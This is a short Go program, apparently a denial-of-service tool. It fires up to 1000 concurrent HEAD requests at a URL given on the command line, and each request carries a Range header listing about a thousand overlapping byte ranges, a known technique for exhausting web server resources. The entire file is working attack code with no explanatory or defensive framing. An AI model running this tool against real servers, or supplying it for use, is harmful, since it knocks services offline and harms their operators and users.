package main
import "fmt"
import "net/http"
import "os"
import "strconv"
import "sync"

func dos(wg *sync.WaitGroup, url string, rangeHeader string, id int) {
    defer wg.Done()
    request, _ := http.NewRequest("HEAD", url, nil)
    request.Header.Set("Range", rangeHeader)
    client := &http.Client{}
    response, err := client.Do(request)
    if err == nil {
//        fmt.Println(request)
        fmt.Println(response)
    }
    fmt.Println(id)
}

func getRangeHeader() string {
    var rangeHeader string = "0-,"
    for i := 0; i < 1000; i++ {
        rangeHeader += "5-" + strconv.Itoa(i) + ","
    }
    return rangeHeader
}

func main() {
    var url string = os.Args[1]

    var dosCount int
    dosCount, _ = strconv.Atoi(os.Args[2])

    if dosCount > 1000 {
        dosCount = 1000
    }

    var wg sync.WaitGroup

    for id := 0; id < dosCount; id++ {
        wg.Add(1)
        go dos(&wg, url, getRangeHeader(), id)
    }

    wg.Wait()
    fmt.Println("Done")
}